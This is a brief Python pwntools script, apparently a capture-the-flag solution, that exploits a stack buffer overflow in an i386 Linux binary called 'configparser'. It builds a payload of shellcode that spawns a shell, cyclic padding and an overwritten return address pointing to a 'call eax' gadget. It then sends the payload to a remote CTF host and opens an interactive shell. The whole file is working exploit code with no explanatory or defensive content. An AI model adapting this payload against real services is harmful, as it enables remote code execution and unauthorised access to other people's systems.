from pwn import *

context(arch = 'i386', os = 'linux')

PROGRAM = './configparser'


RETURN_ADDRESS=0x080485b6  #call eax

#payload=asm(shellcraft.sh()) + '=' + aaaa*100 + '\n\x00'
payload=asm(shellcraft.sh())+"="+cyclic(76) + flat(RETURN_ADDRESS) + "\n"
#print payload
#exit(0)
#p = process(PROGRAM)
p = remote("ctf2016.the-playground.dk", 12002)
p.send(payload)
p.interactive()

